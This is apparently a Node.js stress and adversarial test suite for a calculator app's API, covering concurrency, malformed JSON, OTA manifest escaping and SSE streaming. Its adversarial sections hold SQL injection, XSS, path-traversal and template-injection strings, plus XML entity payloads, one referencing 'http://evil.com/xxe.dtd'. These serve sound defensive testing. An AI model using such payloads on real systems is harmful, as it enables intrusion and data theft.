import {
  assert,
  assertEqual,
  assertStatus,
  assertValidXml,
  readSSEStream,
  fetchWithTimeout,
  colors,
} from './test_utils.mjs';

const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const testResults = [];

async function runTest(name, category, fn) {
  totalTests++;
  const startTime = Date.now();
  try {
    process.stdout.write(`  [TEST ${totalTests}] ${name}... `);
    await fn();
    const duration = Date.now() - startTime;
    passedTests++;
    console.log(`${colors.green}PASS${colors.reset} (${duration}ms)`);
    testResults.push({ name, category, passed: true, duration, error: null });
  } catch (err) {
    const duration = Date.now() - startTime;
    failedTests++;
    console.log(`${colors.red}FAIL${colors.reset} (${duration}ms)`);
    console.log(`    ${colors.red}Error: ${err.message}${colors.reset}`);
    testResults.push({ name, category, passed: false, duration, error: err.message });
  }
}

async function main() {
  console.log(`\n${colors.bold}${colors.cyan}================================================================${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}  EMPIRICAL CHALLENGER STRESS & ADVERSARIAL TEST SUITE          ${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}  Target: ${BASE_URL}                                           ${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}================================================================${colors.reset}\n`);

  // ==========================================
  // SECTION 1: CONCURRENCY & RACE CONDITIONS
  // ==========================================
  console.log(`${colors.bold}${colors.yellow}--- SECTION 1: Concurrency & Race Conditions ---${colors.reset}`);

  await runTest('Parallel Health Probes (100 concurrent requests)', 'concurrency', async () => {
    const requests = Array.from({ length: 100 }, () =>
      fetchWithTimeout(`${BASE_URL}/api/health`, { method: 'GET' })
    );
    const responses = await Promise.all(requests);
    for (const res of responses) {
      assertStatus(res, 200);
      const json = await res.json();
      assertEqual(json.status, 'operational');
      assertEqual(json.healthy, true);
    }
  });

  await runTest('Concurrent History Sync (50 parallel sync operations with distinct UUIDs)', 'concurrency', async () => {
    const batchSize = 50;
    const requests = Array.from({ length: batchSize }, (_, i) => {
      const uniqueId = `concurrency_uuid_${Date.now()}_${i}_${Math.random().toString(36).substring(2, 7)}`;
      return fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: `device_concurrent_${i % 5}`,
          items: [
            {
              id: uniqueId,
              timestamp: new Date().toISOString(),
              expression: `concurrent_expr_${i} * 2`,
              result: `${i * 2}`,
              mode: 'standard',
              notes: `Concurrency test item ${i}`,
            },
          ],
        }),
      });
    });

    const responses = await Promise.all(requests);
    for (const res of responses) {
      assertStatus(res, 200);
      const data = await res.json();
      assertEqual(data.success, true);
      assertEqual(data.syncedCount, 1);
    }
  });

  await runTest('Concurrent History Sync with Overlapping UUIDs (Deduplication stress)', 'concurrency', async () => {
    const sharedId = `shared_dedup_test_${Date.now()}`;
    const requests = Array.from({ length: 25 }, (_, i) =>
      fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: 'device_shared',
          items: [
            {
              id: sharedId,
              timestamp: new Date().toISOString(),
              expression: `shared_expr_${sharedId}`,
              result: `shared_result_${i}`,
              mode: 'standard',
              notes: `shared_tag_${sharedId}`,
            },
          ],
        }),
      })
    );

    const responses = await Promise.all(requests);
    for (const res of responses) {
      assertStatus(res, 200);
      const data = await res.json();
      assertEqual(data.success, true);
    }

    // Verify list endpoint contains exactly 1 instance for this ID
    const listRes = await fetchWithTimeout(`${BASE_URL}/api/history/list?search=${sharedId}`);
    assertStatus(listRes, 200);
    const listData = await listRes.json();
    assertEqual(listData.items.filter((item) => item.id === sharedId).length, 1);
  });

  await runTest('High-Concurrency Mixed Workload (100 parallel heterogeneous requests)', 'concurrency', async () => {
    const endpoints = [
      () => fetchWithTimeout(`${BASE_URL}/api/health`),
      () => fetchWithTimeout(`${BASE_URL}/api/updates/check?version=2.2.0`),
      () => fetchWithTimeout(`${BASE_URL}/api/updates/latest`),
      () => fetchWithTimeout(`${BASE_URL}/api/ota/manifest?bundleId=com.test.app`),
      () => fetchWithTimeout(`${BASE_URL}/api/history/list?limit=10`),
      () =>
        fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ items: [{ expression: '1+1', result: '2', mode: 'standard' }] }),
        }),
    ];

    const requests = Array.from({ length: 100 }, (_, i) => endpoints[i % endpoints.length]());
    const responses = await Promise.all(requests);
    for (const res of responses) {
      assert(res.status === 200 || res.status === 302, `Unexpected status: ${res.status}`);
    }
  });

  await runTest('Concurrent AI Structured Solver (15 parallel requests)', 'concurrency', async () => {
    const formulas = [
      '2x + 4 = 10',
      'sin(pi/2)',
      '15 * 12',
      'sqrt(144)',
      'd/dx(x^2)',
      '100 / 4',
      'log(100)',
      '5^3',
      '3x - 9 = 0',
      '25 + 75',
      'e^0',
      'tan(0)',
      '4! + 5',
      'cos(0)',
      '1000 - 333',
    ];

    const requests = formulas.map((expr) =>
      fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: 'math', expression: expr }),
      })
    );

    const responses = await Promise.all(requests);
    for (let i = 0; i < responses.length; i++) {
      const res = responses[i];
      assertStatus(res, 200);
      const data = await res.json();
      assertEqual(data.success, true);
      assertEqual(data.mode, 'math');
      assert(typeof data.result === 'string' && data.result.length > 0);
    }
  });

  // ==========================================
  // SECTION 2: MALFORMED JSON & BOUNDARY INPUTS
  // ==========================================
  console.log(`\n${colors.bold}${colors.yellow}--- SECTION 2: Malformed JSON & Edge Cases ---${colors.reset}`);

  await runTest('Malformed JSON rejected with HTTP 400 on /api/ai/stream', 'malformed_json', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{ invalid_json: true, missing_quotes }',
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Invalid JSON'), 'Expected error message for invalid JSON');
  });

  await runTest('Malformed JSON rejected with HTTP 400 on /api/ai/solve', 'malformed_json', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"unclosed": "string',
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Invalid JSON'), 'Expected error message for invalid JSON');
  });

  await runTest('Malformed JSON rejected with HTTP 400 on /api/history/sync', 'malformed_json', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '<<< NOT JSON >>>',
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Invalid JSON'), 'Expected error message for invalid JSON');
  });

  await runTest('Empty string body rejected with HTTP 400 on /api/ai/solve', 'malformed_json', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '',
    });
    assertStatus(res, 400);
  });

  await runTest('Empty payload object rejected with HTTP 400 on /api/ai/stream', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Missing required parameter'));
  });

  await runTest('Empty payload object rejected with HTTP 400 on /api/ai/solve', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Missing required parameter'));
  });

  await runTest('Invalid mode rejected with HTTP 400 on /api/ai/solve', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mode: 'unsupported_mode', expression: '2+2' }),
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('Invalid mode'));
  });

  await runTest('Invalid items type rejected with HTTP 400 on /api/history/sync', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ items: 'not an array' }),
    });
    assertStatus(res, 400);
    const data = await res.json();
    assert(data.error && data.error.includes('must be an array'));
  });

  await runTest('Null items field rejected with HTTP 400 on /api/history/sync', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ items: null }),
    });
    assertStatus(res, 400);
  });

  await runTest('Non-object array body rejected with HTTP 400 on /api/history/sync', 'edge_cases', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify([1, 2, 3]),
    });
    assertStatus(res, 400);
  });

  await runTest('Adversarial inputs: SQLi, Unicode, RTL, Null Bytes, Template Injection', 'edge_cases', async () => {
    const adversarialExpressions = [
      "' OR '1'='1' --",
      "DROP TABLE calculations;--",
      "{{7*7}} ${7*7} <%= 7*7 %>",
      "مرحبا بالعالم 123 + 456 = 579",
      "日本語の計算 100円 + 200円",
      "🚀🔥💯 (10 * 10) / 2",
      "\u0000\u0001\u0002 null byte test",
      "<script>alert('xss')</script>",
      "../../../../etc/passwd",
    ];

    for (const expr of adversarialExpressions) {
      // Test structured solve
      const solveRes = await fetchWithTimeout(`${BASE_URL}/api/ai/solve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: 'math', expression: expr }),
      });
      assertStatus(solveRes, 200);
      const solveData = await solveRes.json();
      assertEqual(solveData.success, true);

      // Test history sync
      const syncRes = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          items: [
            {
              expression: expr,
              result: 'adversarial_pass',
              mode: 'standard',
              notes: expr,
            },
          ],
        }),
      });
      assertStatus(syncRes, 200);
      const syncData = await syncRes.json();
      assertEqual(syncData.success, true);
    }
  });

  await runTest('Large Payload Handling (500 history items in single batch sync)', 'edge_cases', async () => {
    const largeBatch = Array.from({ length: 500 }, (_, i) => ({
      id: `bulk_sync_${Date.now()}_${i}`,
      timestamp: new Date().toISOString(),
      expression: `bulk_expr_${i} + 100`,
      result: `${i + 100}`,
      mode: 'standard',
      notes: 'Large batch payload verification string with repeated tokens '.repeat(3),
    }));

    const res = await fetchWithTimeout(`${BASE_URL}/api/history/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: 'bulk_loader', items: largeBatch }),
    });

    assertStatus(res, 200);
    const data = await res.json();
    assertEqual(data.success, true);
    assertEqual(data.syncedCount, 500);
  });

  // ==========================================
  // SECTION 3: XML ENTITY INJECTION & OTA MANIFEST
  // ==========================================
  console.log(`\n${colors.bold}${colors.yellow}--- SECTION 3: XML Entity Injection (XXE) & OTA Manifest ---${colors.reset}`);

  await runTest('XML Entity Injection in OTA query parameters are escaped', 'xml_injection', async () => {
    const attackPayloads = [
      '&customEntity;',
      '<!ENTITY test "exploit">',
      '&amp;&lt;&gt;&apos;&quot;',
      '</string></dict><dict><key>injected</key><string>pwned</string></dict>',
      '"><script>alert(1)</script><dict>',
      '<![CDATA[<test_cdata>]]>',
      '--><!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">',
    ];

    for (const payload of attackPayloads) {
      const url = `${BASE_URL}/api/ota/manifest?bundleId=${encodeURIComponent(
        `com.test.${payload}`
      )}&name=${encodeURIComponent(`App_${payload}`)}&version=${encodeURIComponent(
        `2.3.${payload}`
      )}&ipaUrl=${encodeURIComponent(`https://example.com/${payload}.ipa`)}`;

      const res = await fetchWithTimeout(url);
      assertStatus(res, 200);
      assertEqual(res.headers.get('content-type'), 'text/xml; charset=utf-8');

      const xmlText = await res.text();
      // Ensure XML is strictly well-formed and valid
      assertValidXml(xmlText, `Payload '${payload}' produced malformed XML`);

      // Verify that raw unescaped closing tags do NOT exist in the output
      assert(
        !xmlText.includes('</string></dict><dict><key>injected</key>'),
        'Raw injected XML tags found in output'
      );
      assert(!xmlText.includes('<script>'), 'Unescaped script tags found in XML');
    }
  });

  await runTest('OTA Manifest special characters strictly escaped', 'xml_injection', async () => {
    const rawBundle = 'com.liquidcalc<app>&test"quote\'';
    const rawName = 'Liquid & Calc <"Special" \'Quotes\'>';

    const url = `${BASE_URL}/api/ota/manifest?bundleId=${encodeURIComponent(
      rawBundle
    )}&name=${encodeURIComponent(rawName)}`;

    const res = await fetchWithTimeout(url);
    assertStatus(res, 200);
    const xml = await res.text();

    assertValidXml(xml);
    assert(xml.includes('&amp;'), 'Ampersand not escaped');
    assert(xml.includes('&lt;'), 'Left angle bracket not escaped');
    assert(xml.includes('&gt;'), 'Right angle bracket not escaped');
    assert(xml.includes('&quot;'), 'Double quote not escaped');
    assert(xml.includes('&apos;'), 'Single quote not escaped');
    assert(!xml.includes('<app>'), 'Unescaped tag found');
  });

  await runTest('OTA Binary Redirect handles arbitrary URL parameters safely', 'xml_injection', async () => {
    const customUrl = 'https://github.com/custom/release.ipa';
    const res = await fetchWithTimeout(`${BASE_URL}/api/ota/app?url=${encodeURIComponent(customUrl)}`, {
      redirect: 'manual',
    });
    assert(res.status === 302 || res.status === 307 || res.status === 308);
    assertEqual(res.headers.get('location'), customUrl);
  });

  // ==========================================
  // SECTION 4: SSE STREAM LONGEVITY & ABORT
  // ==========================================
  console.log(`\n${colors.bold}${colors.yellow}--- SECTION 4: SSE Stream Longevity & Client Abort ---${colors.reset}`);

  await runTest('Full SSE stream lifecycle with done token', 'sse_longevity', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        prompt: 'Calculate derivative of 3x^4 - 5x^2 + 7',
      }),
    });

    assertStatus(res, 200);
    assert(res.headers.get('content-type').includes('text/event-stream'));

    const { chunks, fullText, doneReceived } = await readSSEStream(res, 50, 10000);
    assert(chunks.length > 0, 'No SSE chunks received');
    assert(doneReceived, 'SSE stream did not emit done: true');
    assert(fullText.includes('data:'), 'Stream missing standard SSE data prefix');
  });

  await runTest('SSE Stream handles client premature abort gracefully without server crash', 'sse_longevity', async () => {
    const controller = new AbortController();
    const fetchPromise = fetch(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ prompt: 'Simulate long math explanation' }),
      signal: controller.signal,
    });

    // Abort after 50ms while streaming
    setTimeout(() => controller.abort(), 50);

    try {
      const res = await fetchPromise;
      if (res.body) {
        const reader = res.body.getReader();
        await reader.read();
      }
    } catch (err) {
      // Expected AbortError on client side
      assert(err.name === 'AbortError' || err.message.includes('aborted'));
    }

    // Verify server process is still completely alive and responsive
    const healthRes = await fetchWithTimeout(`${BASE_URL}/api/health`);
    assertStatus(healthRes, 200);
  });

  await runTest('SSE Stream with Header Authentication Fallback', 'sse_longevity', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-gemini-api-key': 'test_header_key_12345',
        'Authorization': 'Bearer test_bearer_key_67890',
      },
      body: JSON.stringify({ prompt: 'Integrate cos(x) dx' }),
    });

    assertStatus(res, 200);
    const { chunks, doneReceived } = await readSSEStream(res, 50, 10000);
    assert(chunks.length > 0);
    assert(doneReceived);
  });

  await runTest('SSE Stream with Multimodal Base64 Image Payload', 'sse_longevity', async () => {
    const mockBase64Image = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
    const res = await fetchWithTimeout(`${BASE_URL}/api/ai/stream`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        prompt: 'OCR this math formula',
        image: mockBase64Image,
      }),
    });

    assertStatus(res, 200);
    const { chunks, doneReceived } = await readSSEStream(res, 50, 10000);
    assert(chunks.length > 0);
    assert(doneReceived);
  });

  // ==========================================
  // SECTION 5: SERVERLESS RESILIENCE & HEALTH
  // ==========================================
  console.log(`\n${colors.bold}${colors.yellow}--- SECTION 5: Serverless Process Health Post-Stress ---${colors.reset}`);

  await runTest('Post-Stress Health Check and State Integrity', 'serverless_health', async () => {
    const res = await fetchWithTimeout(`${BASE_URL}/api/health`);
    assertStatus(res, 200);
    const health = await res.json();
    assertEqual(health.status, 'operational');
    assertEqual(health.healthy, true);
    assert(health.uptime > 0, 'Uptime must be positive');
    assertEqual(health.version, '2.3.0');
    assertEqual(health.services.gemini_gateway.status, 'operational');
    assertEqual(health.services.ota_signer.status, 'operational');
    assertEqual(health.services.updates_dist.status, 'operational');
    assertEqual(health.services.history_sync.status, 'operational');
    assert(health.services.history_sync.recordsCount > 500, 'Records count must reflect synced items');
  });

  // ==========================================
  // SUMMARY REPORT
  // ==========================================
  console.log(`\n${colors.bold}${colors.cyan}================================================================${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}  TEST EXECUTION SUMMARY                                        ${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}================================================================${colors.reset}`);
  console.log(`  Total Tests Run : ${colors.bold}${totalTests}${colors.reset}`);
  console.log(`  Passed Tests    : ${colors.green}${colors.bold}${passedTests}${colors.reset}`);
  console.log(`  Failed Tests    : ${failedTests > 0 ? colors.red : colors.green}${colors.bold}${failedTests}${colors.reset}`);
  console.log(`  Pass Rate       : ${colors.bold}${((passedTests / totalTests) * 100).toFixed(1)}%${colors.reset}`);

  if (failedTests > 0) {
    console.log(`\n${colors.red}${colors.bold}VERDICT: REQUEST_CHANGES (${failedTests} test(s) failed)${colors.reset}\n`);
    process.exit(1);
  } else {
    console.log(`\n${colors.green}${colors.bold}VERDICT: APPROVE (100% empirical stress tests passed)${colors.reset}\n`);
    process.exit(0);
  }
}

main().catch((err) => {
  console.error('Fatal test runner error:', err);
  process.exit(1);
});
